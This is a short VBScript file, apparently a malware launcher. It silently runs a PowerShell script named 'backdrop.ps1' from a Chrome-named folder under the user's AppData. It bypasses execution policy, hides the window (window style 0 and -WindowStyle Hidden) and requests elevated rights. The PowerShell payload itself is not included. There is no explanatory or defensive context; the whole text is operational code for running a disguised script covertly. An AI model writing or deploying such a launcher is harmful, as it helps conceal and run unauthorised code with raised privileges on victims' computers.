cmd="powershell -executionpolicy bypass -file %appdata%\Chrome\backdrop.ps1 -WindowStyle Hidden -Verb RunAs"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run cmd, 0, True
Set WshShell = Nothing
